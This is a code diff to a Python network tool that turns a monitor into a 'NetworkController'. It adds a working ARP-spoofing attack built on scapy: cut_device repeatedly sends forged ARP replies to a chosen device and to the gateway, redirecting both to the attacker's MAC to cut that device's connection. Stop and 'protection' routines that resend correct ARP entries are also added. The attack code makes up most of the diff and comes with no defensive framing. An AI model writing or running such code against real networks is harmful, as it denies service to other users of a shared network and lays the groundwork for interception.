@@ -4,16 +4,19 @@ import subprocess
 import logging
 import time
 import socket
-from scapy.all import ARP, Ether, srp
+from scapy.all import ARP, Ether, srp, send
 from dataclasses import dataclass
 from typing import List, Dict, Optional, Tuple
 import json
 from datetime import datetime
-import ifaddr  # Using ifaddr instead of netifaces
+import ifaddr
 import requests
 import threading
 import queue
-import os  # Add this import
+import os
+from scapy.layers.l2 import arping
+from scapy.sendrecv import srloop
+from scapy.arch import get_if_hwaddr
 
 @dataclass
 class Device:
@@ -22,18 +25,22 @@ class Device:
     hostname: Optional[str] = None
     vendor: Optional[str] = None
     device_type: Optional[str] = None
-    signal_strength: Optional[int] = None  # RSSI value in dBm
+    signal_strength: Optional[int] = None
     connection_type: str = "WiFi"
     status: str = "active"
     speed_limit: Optional[float] = None
     current_speed: float = 0.0
     last_seen: datetime = None
+    is_protected: bool = False
+    is_blocked: bool = False
+    attack_status: str = "none"  # none, scanning, cutting
 
     def __post_init__(self):
         if self.last_seen is None:
             self.last_seen = datetime.now()
 
-class NetworkMonitor:
+
+class NetworkController:
     def __init__(self):
         self.os_type = platform.system()
         self.devices: Dict[str, Device] = {}
@@ -41,15 +48,16 @@ class NetworkMonitor:
         self.setup_logging()
         self._stop_event = threading.Event()
         self.monitoring_thread = None
-        self.speed_tracking = {}
-        self.device_groups = {"unlimited": [], "limited": []}
-        self.speed_update_queue = queue.Queue()
+        self.attack_threads: Dict[str, threading.Thread] = {}
+        self.protected_devices: List[str] = []
+        self._gateway_mac = None
+        self._gateway_ip = None
         
-        # Set system commands based on OS
         if self.os_type == "Windows":
             self.ipconfig_path = self._get_windows_command_path("ipconfig.exe")
             self.netsh_path = self._get_windows_command_path("netsh.exe")
-
+            self.arp_path = self._get_windows_command_path("arp.exe")
+            
     def _get_windows_command_path(self, command):
         """Get full path for Windows system commands"""
         system32 = os.path.join(os.environ['SystemRoot'], 'System32')
@@ -65,6 +73,168 @@ class NetworkMonitor:
                 logging.StreamHandler()
             ]
         )
+    
+    def _get_gateway_info(self) -> Tuple[str, str]:
+        """Get gateway IP and MAC address"""
+        try:
+            if self.os_type == "Windows":
+                # Get default gateway IP
+                output = subprocess.check_output([self.ipconfig_path], 
+                                              text=True,
+                                              creationflags=subprocess.CREATE_NO_WINDOW)
+                gateway_ip = None
+                for line in output.split('\n'):
+                    if "Default Gateway" in line:
+                        gateway_ip = line.split(":")[-1].strip()
+                        break
+                
+                if gateway_ip:
+                    # Get gateway MAC using ARP
+                    arp_output = subprocess.check_output([self.arp_path, "-a"], 
+                                                       text=True,
+                                                       creationflags=subprocess.CREATE_NO_WINDOW)
+                    for line in arp_output.split('\n'):
+                        if gateway_ip in line:
+                            mac = line.split()[-1].strip()
+                            return gateway_ip, mac
+            else:
+                # Linux/MacOS implementation
+                gateway_ip = subprocess.check_output("ip route | grep default | cut -d' ' -f3", 
+                                                  shell=True).decode().strip()
+                if gateway_ip:
+                    result = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=gateway_ip), 
+                               timeout=2, verbose=False)[0]
+                    if result:
+                        return gateway_ip, result[0][1].hwsrc
+
+        except Exception as e:
+            logging.error(f"Error getting gateway info: {e}")
+        return None, None
+
+    def protect_device(self, ip: str) -> bool:
+        """Enable protection for a device"""
+        try:
+            device = self.devices.get(ip)
+            if device:
+                device.is_protected = True
+                self.protected_devices.append(ip)
+                # Start ARP spoofing protection
+                self._start_protection(ip, device.mac)
+                return True
+            return False
+        except Exception as e:
+            logging.error(f"Error protecting device: {e}")
+            return False
+
+    def unprotect_device(self, ip: str) -> bool:
+        """Disable protection for a device"""
+        try:
+            device = self.devices.get(ip)
+            if device:
+                device.is_protected = False
+                if ip in self.protected_devices:
+                    self.protected_devices.remove(ip)
+                return True
+            return False
+        except Exception as e:
+            logging.error(f"Error unprotecting device: {e}")
+            return False
+
+    def _start_protection(self, ip: str, mac: str):
+        """Start ARP spoofing protection for a device"""
+        def protection_loop():
+            try:
+                gateway_ip, gateway_mac = self._get_gateway_info()
+                if not gateway_ip or not gateway_mac:
+                    return
+                
+                # Send gratuitous ARP responses to maintain correct ARP tables
+                while ip in self.protected_devices:
+                    # Send ARP to device with correct gateway info
+                    self._send_arp(ip, mac, gateway_ip, gateway_mac)
+                    # Send ARP to gateway with correct device info
+                    self._send_arp(gateway_ip, gateway_mac, ip, mac)
+                    time.sleep(1)
+            except Exception as e:
+                logging.error(f"Error in protection loop: {e}")
+
+        thread = threading.Thread(target=protection_loop)
+        thread.daemon = True
+        thread.start()
+
+    def cut_device(self, ip: str) -> bool:
+        """Cut network access for a device using ARP spoofing"""
+        try:
+            device = self.devices.get(ip)
+            if not device or device.is_protected:
+                return False
+
+            device.attack_status = "cutting"
+            
+            def attack_loop():
+                try:
+                    gateway_ip, gateway_mac = self._get_gateway_info()
+                    if not gateway_ip or not gateway_mac:
+                        return
+                    
+                    # Get our interface MAC
+                    iface = self.get_default_interface()
+                    our_mac = get_if_hwaddr(iface)
+                    
+                    while device.attack_status == "cutting":
+                        # Send spoofed ARP to target
+                        self._send_arp(ip, device.mac, gateway_ip, our_mac)
+                        # Send spoofed ARP to gateway
+                        self._send_arp(gateway_ip, gateway_mac, ip, our_mac)
+                        time.sleep(1)
+                        
+                except Exception as e:
+                    logging.error(f"Error in attack loop: {e}")
+                finally:
+                    device.attack_status = "none"
+                    
+            if ip in self.attack_threads:
+                self.stop_cut(ip)
+                
+            thread = threading.Thread(target=attack_loop)
+            thread.daemon = True
+            thread.start()
+            self.attack_threads[ip] = thread
+            
+            return True
+        except Exception as e:
+            logging.error(f"Error cutting device: {e}")
+            return False
+
+    def stop_cut(self, ip: str) -> bool:
+        """Stop network cut for a device"""
+        try:
+            device = self.devices.get(ip)
+            if device:
+                device.attack_status = "none"
+                if ip in self.attack_threads:
+                    self.attack_threads[ip].join(timeout=2)
+                    del self.attack_threads[ip]
+                    
+                # Restore correct ARP entries
+                gateway_ip, gateway_mac = self._get_gateway_info()
+                if gateway_ip and gateway_mac:
+                    self._send_arp(ip, device.mac, gateway_ip, gateway_mac)
+                    self._send_arp(gateway_ip, gateway_mac, ip, device.mac)
+                    
+                return True
+            return False
+        except Exception as e:
+            logging.error(f"Error stopping cut: {e}")
+            return False
+
+    def _send_arp(self, target_ip: str, target_mac: str, spoof_ip: str, spoof_mac: str):
+        """Send ARP packet with specified addresses"""
+        try:
+            arp = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=spoof_mac)
+            send(arp, verbose=False)
+        except Exception as e:
+            logging.error(f"Error sending ARP: {e}")
 
     def get_interfaces(self) -> List[Dict]:
         """Get all network interfaces"""
